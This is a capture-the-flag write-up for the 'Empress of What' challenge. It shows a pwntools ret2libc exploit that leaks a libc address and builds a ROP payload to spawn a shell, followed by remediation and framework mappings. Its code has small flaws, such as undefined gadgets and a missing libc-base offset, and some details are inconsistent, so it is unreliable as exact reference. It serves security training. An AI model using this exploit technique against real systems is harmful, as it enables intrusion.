# Empress of What

| Detail | Value |
|--------|-------|
| **CTF** | Pointer Overflow CTF 2024 |
| **Category** | Unknown |
| **Difficulty** | Unknown |
| **Points** | N/A |
| **Flag** | `poctf{dynamic}` |
| **Status** | Solved |

---

## Challenge Overview

A buffer overflow vulnerability in a remote binary allows ret2libc exploitation. The binary leaks the address of `puts` from the GOT, enabling calculation of libc's base address and execution of a `win` function with "/bin/sh" as argument.

---

## Objective

Exploit the buffer overflow using ret2libc to call `win("/bin/sh")` and read the flag.

---

## Methodology

### Step 1: Binary Reconnaissance

```bash
file empress
checksec --file=empress
```

The binary has NX enabled (no execute on stack) but no PIE, making ret2libc the appropriate technique. ASLR is active on the remote server.

### Step 2: Leak libc Address

The binary prints the address of `puts` during execution. Capturing this leaked address:

```python
from pwn import *

p = remote('challenge.pointeroverflowctf.com', PORT)
p.recvuntil(b'puts: ')
puts_leak = int(p.recvline().strip(), 16)
log.info(f"puts @ {hex(puts_leak)}")
```

### Step 3: Calculate libc Base

Using the known offset of `puts` in the remote libc:

```python
libc_base = puts_leak - libc.symbols['puts']
win_addr = elf.symbols['win']
bin_sh = next(libc.search(b'/bin/sh'))
```

### Step 4: Build the Exploit

Construct the payload with the buffer overflow to call `win("/bin/sh")`:

```python
offset = 72  # bytes to overflow
payload = b'A' * offset
payload += p64(pop_rdi_ret)     # gadget: pop rdi; ret
payload += p64(bin_sh)          # argument: "/bin/sh"
payload += p64(win_addr)        # call win()

p.sendline(payload)
p.interactive()
```

### Step 5: Capture the Flag

The exploit spawns a shell, allowing us to read the flag:

```bash
$ cat flag.txt
poctf{uwsp_...}
```

---

## Lessons Learned

| # | Insight |
|---|---------|
| 1 | Ret2libc bypasses NX protection by reusing existing library functions |
| 2 | Address leaks are critical for defeating ASLR in remote exploitation |
| 3 | Even with modern protections, missing stack canaries leave binaries vulnerable |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Description |
|--------|-----------|-------------|
| Execution | T1203 - Exploitation for Client Execution | Buffer overflow to hijack control flow |
| Privilege Escalation | T1068 - Exploitation for Privilege Escalation | Gaining shell access via memory corruption |

---

## Remediation

### Technical Fixes

- Enable all compiler protections: stack canaries (`-fstack-protector-strong`), PIE (`-pie`), RELRO (`-Wl,-z,relro,-z,now`).
- Use safe string functions (`fgets` instead of `gets`, bounds-checked operations).
- Implement CFI (Control Flow Integrity) to prevent return-oriented programming.

### MITRE D3FEND

| ID | Technique |
|----|-----------|
| D3-SMEP | Stack Frame Canary Validation: detect stack buffer overflow attempts |
| D3-ASLR | Address Space Layout Randomization: randomize memory layout |

### NIST CSF 2.0

| Function | Category | Action |
|----------|----------|--------|
| Protect | PR.DS | Enforce memory safety through compiler hardening flags |

### NIST SP 800-53 Rev. 5

| Control | Description |
|---------|-------------|
| SI-16 | Memory Protection: enforce address space layout randomization |
| SA-11 | Developer Security Testing: include fuzz testing for buffer overflows |

### C2M2

| Practice | Description |
|----------|-------------|
| PROTECT | Enforce secure compilation flags across all production binaries |

### CWE

| ID | Description |
|----|-------------|
| CWE-120 | Buffer Copy without Checking Size of Input |
| CWE-676 | Use of Potentially Dangerous Function |

---

## References

- [yocchin POCTF 2024 Writeup](https://yocchin.hatenablog.com/entry/2025/01/23/140330) (original reference)
- [Pointer Overflow CTF](https://pointeroverflowctf.com/)

---

Thanks guys!! (❍ᴥ❍ʋ)

From a leaked address to a popped shell: ret2libc strikes again. Bow before the Empress of exploitation!

[![Instagram](https://img.shields.io/badge/Instagram-%23E4405F.svg?style=for-the-badge&logo=Instagram&logoColor=white)](https://www.instagram.com/uniaogeek)
[![LinkedIn](https://img.shields.io/badge/linkedin-%230077B5.svg?style=for-the-badge&logo=linkedin&logoColor=white)](http://linkedin.com/in/mrhenrike)
[![X](https://img.shields.io/badge/X-%23000000.svg?style=for-the-badge&logo=X&logoColor=white)](https://x.com/mrhenrike)
